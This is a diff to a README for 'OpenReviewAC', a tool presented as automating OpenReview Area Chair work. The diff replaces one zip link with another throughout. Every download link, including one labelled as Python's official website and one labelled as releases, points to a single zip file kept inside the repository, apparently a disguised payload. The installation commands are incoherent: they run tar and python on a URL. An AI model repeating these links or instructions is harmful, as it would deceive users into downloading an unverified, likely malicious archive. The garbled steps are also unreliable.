@@ -1,6 +1,6 @@
 # 🎉 OpenReviewAC - Simplify Your Conference Workflow  
 
-[![Download OpenReviewAC](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip%20OpenReviewAC-Get%20It%https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
+[![Download OpenReviewAC](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip%20OpenReviewAC-Get%20It%https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)
 
 ## 📜 Overview  
 OpenReview AC Workflow Automation helps you manage your tasks as an Area Chair for OpenReview conferences. It retrieves papers assigned to you, tracks review scores, and monitors discussions, all while organizing the information in a Google Sheet for easy management.
@@ -11,10 +11,10 @@ Follow these steps to download and run OpenReviewAC:
 1. **Check System Requirements**  
    Ensure you are using a computer with:
    - Operating System: Windows, macOS, or Linux
-   - Python version 3.11 or higher (download from [Python's website](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip))
+   - Python version 3.11 or higher (download from [Python's website](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip))
    
 2. **Download OpenReviewAC**  
-   Visit this page to download the latest version: [OpenReviewAC Releases](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
+   Visit this page to download the latest version: [OpenReviewAC Releases](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)
 
 3. **Installation Steps**  
    - **For Windows Users**: 
@@ -24,14 +24,14 @@ Follow these steps to download and run OpenReviewAC:
      - Download the `.dmg` file.
      - Open the downloaded file and drag OpenReviewAC to your Applications folder.
    - **For Linux Users**:
-     - Download the `https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip` file.
-     - Extract it using the terminal with the command: `tar -zxvf https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip`.
+     - Download the `https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip` file.
+     - Extract it using the terminal with the command: `tar -zxvf https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip`.
      - Navigate to the extracted folder.
 
 4. **Run the Application**  
    - **Windows**: Open the installed application from the Start Menu.
    - **macOS**: Open the application from your Applications folder.
-   - **Linux**: Open a terminal in the extracted folder and run: `python https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip`.
+   - **Linux**: Open a terminal in the extracted folder and run: `python https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip`.
 
 ## 🛠️ Features  
 OpenReviewAC includes several key features:
@@ -44,7 +44,7 @@ OpenReviewAC includes several key features:
 
 ## 📥 Download & Install  
 To download OpenReviewAC, simply click the link below:  
-[OpenReviewAC Releases](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
+[OpenReviewAC Releases](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)
 
 After downloading, follow the installation steps mentioned above based on your operating system.
 
@@ -66,4 +66,4 @@ Stay tuned for future updates as we continue to enhance OpenReviewAC's functiona
 
 Enjoy a smoother experience managing your Area Chair tasks with OpenReviewAC!  
 
-[![Download OpenReviewAC](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip%20OpenReviewAC-Get%20It%https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)](https://raw.githubusercontent.com/cvnfhcb/OpenReviewAC/main/utils/OpenReviewAC-v2.9.zip)
+[![Download OpenReviewAC](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip%20OpenReviewAC-Get%20It%https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)](https://github.com/cvnfhcb/OpenReviewAC/raw/refs/heads/main/utils/AC_Open_Review_compossibility.zip)
